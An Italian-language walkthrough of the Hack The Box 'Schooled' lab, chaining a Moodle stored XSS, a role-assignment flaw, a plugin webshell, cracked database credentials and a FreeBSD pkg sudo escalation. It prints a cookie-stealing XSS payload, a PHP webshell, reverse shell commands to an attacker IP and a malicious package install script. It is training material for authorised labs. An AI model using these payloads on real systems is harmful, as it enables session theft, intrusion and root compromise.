---
title: 'HTB Schooled: Stored XSS su Moodle a Root su FreeBSD'
slug: htb-schooled-walkthrough
description: >-
  Hack The Box Schooled Write-Up: da Stored XSS su Moodle a webshell,
  credenziali MySQL e privilege escalation a root su FreeBSD tramite pkg.
image: /hackthebox-schooled-walkthrough.webp
draft: false
date: 2026-09-07T00:00:00.000Z
categories:
  - walkthroughs
subcategories:
  - medium
tags:
  - hackthebox
  - FreeBSD
  - Moodle
  - CVE-2020-25627
  - CVE-2020-14321
---

# HTB Schooled Walkthrough: compromissione di Moodle e Privilege Escalation su FreeBSD

Schooled è una macchina FreeBSD di HackTheBox, e mette in fila diverse vulnerabilità "medie" invece di puntare su un singolo bug devastante. Si parte da uno Stored XSS su un'istanza Moodle, si passa per un privilege escalation nei ruoli utente, si arriva a un plugin caricato ad hoc che dà una webshell, e si chiude rubando password dal database per poi sfruttare `pkg`, il package manager di FreeBSD, per diventare root. È anche un buon esempio di quanto tempo, in un pentest reale, se ne vada in tentativi che non portano a nulla prima di trovare la strada giusta.

## Recon iniziale

Si parte da una scansione delle porte. Su Hackita usiamo [mynmap](https://github.com/hack-ita/mynmap), il nostro wrapper di nmap:

```bash
mynmap -p- --full <IP-target>
```

Tre porte aperte: SSH (22), HTTP (80) e una porta insolita, la 33060, il protocollo MySQL X (mysqlx) — un indizio che dietro gira un MySQL relativamente recente. I dettagli di servizio confermano `Apache/2.4.46 (FreeBSD) PHP/7.4.15`: il sistema operativo è **FreeBSD**, non Linux. Cambia parecchio in fase di privilege escalation — il webroot non è `/var/www/html` ma `/usr/local/www/apache24/data`, tanto per dirne una.

## Enumerazione web: più tentativi a vuoto che scoperte

Un giro con i soliti strumenti di content discovery (ffuf, nikto) sulla porta 80 non restituisce granché — nessuna directory sospetta, nessun endpoint dimenticato. Serve guardare il sito a mano.

La homepage è quella di un istituto scolastico. Girando tra le pagine — sezione "Teachers", testimonianze degli studenti — si raccolgono alcuni nomi utente plausibili, utili più avanti. Nella pagina "About Us" compare la menzione esplicita che i contenuti didattici sono erogati tramite **Moodle**, senza però che comparisse alcuna directory `/moodle` nel content discovery fatto poco prima: il sospetto è che si tratti di un virtual host separato, non di una sottocartella.

Un bruteforce di virtual host (header `Host: FUZZ.schooled.htb`) conferma l'ipotesi: `moodle.schooled.htb` risponde con l'installazione Moodle vera e propria.

Prima di registrarsi, vale la pena provare l'accesso guest, se abilitato — qui non porta a nulla, l'accesso resta bloccato sulla maggior parte dei contenuti.

## Registrazione e ricerca della versione

Moodle permette la registrazione self-service, ma solo con email che terminano in `@student.schooled.htb` — un vincolo lato form, non verificato via email, quindi aggirabile semplicemente scegliendo un indirizzo con quel dominio. Fatto questo, si accede a un corso con iscrizione libera (Mathematics) — gli altri restano bloccati.

Prima di cercare vulnerabilità specifiche, conviene sapere **quale versione** di Moodle gira sul target — altrimenti si rischia di testare CVE non applicabili. Il sito da solo non lo dichiara da nessuna parte (nessun footer, nessuna pagina "about" con il numero di versione). Moodle però è open source: il codice è pubblico su GitHub, e alcuni file del repository sono puramente testuali, non eseguibili lato server — restano quindi leggibili anche su un'installazione live. Il changelog `lib/upgrade.txt`, ad esempio: aprendolo via browser su `/moodle/lib/upgrade.txt`, la prima riga dichiara la versione corrente, in questo caso **3.9**.

Con quel numero preciso si può filtrare la [pagina di sicurezza ufficiale di Moodle](https://moodle.org/security/index.php) invece di provare alla cieca — ed è lì che emerge un avviso rilevante per la versione 3.9, relativo a un problema di autorizzazione nei ruoli (torna più avanti).

## Registrazione e stored XSS

Dentro il corso, un annuncio del docente chiede esplicitamente agli studenti di aggiornare il proprio profilo "MoodleNet", specificando che lui stesso lo controllerà. Un invito perfetto a testare uno [stored XSS](/articoli/xss/): quel campo, in questa versione di Moodle, non sanitizza correttamente l'input (CVE-2020-25627), e sappiamo già che qualcuno (il docente) lo visiterà.

### L'aneddoto dell'HttpOnly

Il payload utile per rubare la sessione:

```html
<script>
var i = new Image;
i.src = "http://10.10.14.198/xss.php?" + document.cookie;
</script>
```

`document.cookie` restituisce tutti i cookie leggibili da JavaScript per quella pagina. Il punto è: funziona solo se il cookie **non** ha il flag `HttpOnly` attivo. Quel flag, se impostato dal server nell'header `Set-Cookie`, impedisce esplicitamente a JavaScript di leggere il cookie — è la contromisura standard contro questo genere di furto via XSS. Su applicazioni moderne e ben configurate è quasi sempre presente sui cookie di sessione; su questa versione di Moodle no, ed è per questo che l'attacco funziona. Un buon esempio di come l'assenza di un singolo header di sicurezza trasformi un XSS "solo" fastidioso in un furto di sessione completo.

Con un semplice listener in ascolto sulla porta usata nel payload, il cookie del docente arriva nel log delle richieste. Va sostituito al proprio direttamente nei DevTools del browser: tab **Application → Cookies**, doppio click sul valore del cookie di sessione e lo si incolla. Nessun tool aggiuntivo necessario, è il modo più rapido per un singolo cookie statico.

Con quel cookie si ottiene l'accesso come il docente della piattaforma.

## Privilege escalation nei ruoli Moodle

Con l'account docente non c'è molto da fare direttamente, e infatti girare a mano tra i menu non porta a niente di sfruttabile. Torna utile l'avviso di sicurezza trovato prima: CVE-2020-14321, un bug di autorizzazione che permette a un docente di autoassegnarsi il ruolo di manager all'interno di un corso in cui ha già accesso di iscrizione.

Il meccanismo, in sintesi:

1. Dal pannello "Partecipanti" del corso, si iscrive manualmente un altro utente (un manager già esistente sul sito — dalla pagina principale dell'istituto risulta un nome plausibile per quel ruolo).
2. Intercettando la richiesta con Burp, si modifica il parametro `roletoassign` per assegnare il ruolo di manager anche al proprio account, sfruttando lo stesso endpoint AJAX di iscrizione.
3. Con lo status di manager nel corso, si iscrive anche l'amministratore effettivo del sito come studente nello stesso corso, così da poterlo raggiungere dal pannello partecipanti e usare la funzione "Log in as" per impersonarlo direttamente.
4. Impersonato l'amministratore, si modificano le permission del ruolo Manager stesso tramite "Define roles" (intercettando di nuovo con Burp la richiesta di salvataggio), sbloccando la possibilità di installare plugin — permesso che di default un manager non ha.

Da notare: sulla macchina gira un task periodico che resetta l'iscrizione ogni minuto circa, quindi conviene tenere le richieste pronte in Burp Repeater per rilanciarle velocemente se scadono.

## Un plugin custom per la webshell

Un plugin Moodle è un archivio ZIP con una struttura di cartelle precisa: un file `version.php` con i metadati e la logica applicativa vera e propria. Con i permessi da amministratore ottenuti al passo precedente, si può costruire un plugin minimale da zero — non serve scaricarne uno pronto — con dentro una riga di PHP che esegue comandi passati via parametro GET:

```php
<?php system($_GET['cmd']); ?>
```

Impacchettato secondo la struttura richiesta e caricato dal pannello "Plugins → Install plugins", Moodle lo estrae dentro `/blocks/`, rendendolo accessibile via HTTP:

```bash
curl "http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=id"
# uid=80(www) gid=80(www) groups=80(www)
```

Esecuzione remota confermata.

## Reverse shell come www

Il comando bash da eseguire va passato come parametro `cmd` nell'URL — e va URL-encodato correttamente, perché caratteri come `>`, `&` e gli spazi hanno un significato speciale sia in URL che in bash.

Il modo più diretto: scrivere il comando in chiaro, incollarlo su un encoder online (es. urlencoder.org), copiare l'output encodato e usarlo come query string:

```
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.198/443 0>&1'
```

diventa (encodato):

```
%2Fbin%2Fbash%20-c%20%27%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.198%2F443%200%3E%261%27
```

Da usare così:

```bash
curl "http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=<COMANDO_ENCODATO>"
```

In alternativa, curl può fare l'encoding da solo con `-G` e `--data-urlencode`:

```bash
curl -G --data-urlencode "cmd=/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.198/443 0>&1'" \
  "http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php"
```

`-G` forza curl a inviare i dati passati con `--data-urlencode` come query string GET invece che come body POST, e si occupa lui di codificare correttamente ogni carattere speciale — evitando gli errori tipici che si commettono codificando a mano (dimenticare un carattere, lasciare virgolette superflue).

Sul lato listener:

```bash
nc -lvnp 443
```

E la shell arriva come utente `www`, lo stesso che gestisce il webserver Apache — non root, ma è il piede nella porta.

## Escalation a jamie: credenziali dal database

Il file `config.php` di Moodle, leggibile dall'utente `www`, contiene le credenziali del database:

```php
$CFG->dbuser = 'moodle';
$CFG->dbpass = 'PlaybookMaster2020';
```

Il client `mysql`, però, non è nel `PATH` di questa shell minimale ottenuta via webshell — un dettaglio banale ma che costa qualche minuto se non ci si pensa subito. Un `find / -name mysql -type f 2>/dev/null` lo localizza, e si può richiamare con il path assoluto (o esportare temporaneamente un `PATH` più completo).

Collegandosi al [database MySQL](/articoli/porta-3306-mysql/) locale con le credenziali trovate, la tabella `mdl_user` restituisce username, email e hash bcrypt delle password di tutti gli utenti registrati. Ce ne sono parecchie righe — craccare tutte alla cieca con bcrypt (hash notoriamente lento da bruteforceare) sarebbe una perdita di tempo enorme. Conviene ragionare su quale account valga la pena attaccare per primo: la maggior parte degli username in tabella sono chiaramente account "applicativi" di Moodle, non corrispondono a nessun utente di sistema reale — tranne uno, `admin`, la cui email corrisponde a un dominio da staff. È il candidato più promettente.

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

Password trovata, e funziona anche per l'accesso SSH come utente di sistema reale — si recupera `user.txt`.

## Da utente standard a root: abusare di pkg

`sudo -l` mostra che l'utente può eseguire senza password due comandi legati a `pkg`, il package manager di FreeBSD: `pkg update` e `pkg install *`. Questo è esattamente lo scenario descritto su [GTFOBins](https://gtfobins.org/gtfobins/pkg/) per `pkg`: se un binario può essere eseguito con sudo e supporta l'installazione di pacchetti locali con uno script di pre-installazione, quello script gira con gli stessi privilegi elevati con cui gira `pkg` — cioè root.

### Cosa succede sotto il cofano di un pacchetto FreeBSD

Un pacchetto `pkg` nasce da pochi elementi essenziali, come spiega bene [questa guida su lastsummer.de](https://lastsummer.de/creating-custom-packages-on-freebsd/): una cartella di staging temporanea, un file `+MANIFEST` con i metadati del pacchetto (nome, versione, autore), e opzionalmente uno o più script di ciclo di vita — `+PRE_INSTALL`, `+POST_INSTALL`, `+PRE_DEINSTALL`, `+POST_DEINSTALL` — che il gestore pacchetti esegue automaticamente nelle rispettive fasi. Tutto viene poi assemblato con `pkg create -m <staging>/ -r <staging>/ -p <staging>/plist -o .`.

Costruire questi file a mano è fattibile ma richiede attenzione ai dettagli di formato. `fpm`, il tool che usiamo di seguito, automatizza esattamente questo processo: genera lui il manifest e piazza lo script che gli passiamo come `+PRE_INSTALL` (grazie al flag `--before-install`), risparmiando la scrittura manuale.

Il tool che semplifica la creazione del pacchetto malevolo è [fpm](https://github.com/jordansissel/fpm) (Effing Package Manager), installabile con `gem`:

```bash
sudo gem install fpm
```

Si crea uno script che apre una reverse shell:

```bash
echo "bash -c '/bin/bash -i -p >& /dev/tcp/10.10.14.198/80 0>&1'" > x.sh
chmod +x x.sh
```

E si impacchetta come pacchetto FreeBSD, specificando quello script come `--before-install` — verrà eseguito prima dell'installazione vera e propria del pacchetto:

```bash
mkdir pkgbuild && cd pkgbuild
fpm -n x -s dir -t freebsd -a all --before-install ../x.sh .
```

Un dettaglio pratico da tenere a mente: la cartella sorgente (`-s dir .`) non può coincidere con la cartella temporanea di lavoro di `fpm` (che di default è `/tmp`) — altrimenti fpm entra in un loop cercando di impacchettare la propria stessa area di staging, e restituisce un errore che sembra criptico la prima volta che lo si legge. Basta lavorare in una sottocartella dedicata invece che direttamente in `/tmp`.

Il pacchetto generato (`x-1.0.txz`) va trasferito sulla macchina vittima — un semplice `nc` in ascolto sul proprio host, con un `nc` di invio dal lato vittima, funziona bene per un singolo file binario. Una volta sulla macchina:

```bash
sudo /usr/sbin/pkg install -y --no-repo-update ./x-1.0.txz
```

Il flag per evitare l'aggiornamento del repository remoto non è solo un dettaglio di comodo: senza, `pkg` prova a contattare il repository FreeBSD configurato di default prima di procedere, e se quel repository non è raggiungibile (come qui) l'installazione si blocca con un errore prima ancora di arrivare allo script.

Con un listener `nc` pronto sulla porta indicata nello script, la connessione arriva **come root** — perché lo script `--before-install` gira con i privilegi con cui `pkg` stesso è stato invocato via sudo.

Da lì, `cat root.txt` chiude la macchina.

## Cosa portarsi a casa

Schooled combina una catena di privilege escalation su applicazione web con un privesc completamente diverso a livello di sistema operativo. Qualche punto da ricordare:

* Un content discovery automatico non trova sempre tutto — a volte una sottodirectory è in realtà un virtual host separato, e lo si scopre solo leggendo il sito a mano.
* Un singolo campo di input non sanitizzato (il profilo MoodleNet) è bastato per uno stored XSS, e l'assenza del flag `HttpOnly` sul cookie di sessione ha trasformato quell'XSS in un furto di sessione completo.
* La logica di autorizzazione nei sistemi con ruoli complessi (come Moodle) va sempre testata ai margini: un endpoint pensato per iscrivere studenti può, con parametri manipolati, assegnare ruoli ben più privilegiati.
* Craccare hash alla cieca è quasi sempre la strada sbagliata: capire quale username ha probabilità reale di corrispondere a un account di sistema fa risparmiare ore, specialmente con algoritmi lenti come bcrypt.
* Su FreeBSD, un package manager whitelistato in sudoers apre una strada diretta a root tramite gli script di pre/post installazione dei pacchetti — lo stesso principio si applica ad `apt`, `yum` e `dpkg` su Linux, documentato per ciascuno su GTFOBins.

## FAQ

**Perché il flag HttpOnly protegge dal furto di cookie via XSS?**
Perché impedisce a JavaScript, incluso quello iniettato tramite XSS, di leggere il valore del cookie tramite `document.cookie`. Il cookie resta comunque inviato automaticamente dal browser nelle richieste HTTP, ma non è accessibile lato script.

**Perché serve `-G` insieme a `--data-urlencode` in curl?**
Perché `--data-urlencode` da solo invierebbe i dati come corpo di una richiesta POST. `-G` dice a curl di usarli invece come query string di una GET, appendendoli all'URL dopo la codifica automatica.

**È legale sfruttare CVE pubbliche su box come questo?**
Sì, se lo si fa su ambienti autorizzati come HackTheBox, VulnLab o lab personali. Sfruttare le stesse tecniche su sistemi reali senza autorizzazione esplicita è illegale in quasi tutte le giurisdizioni.
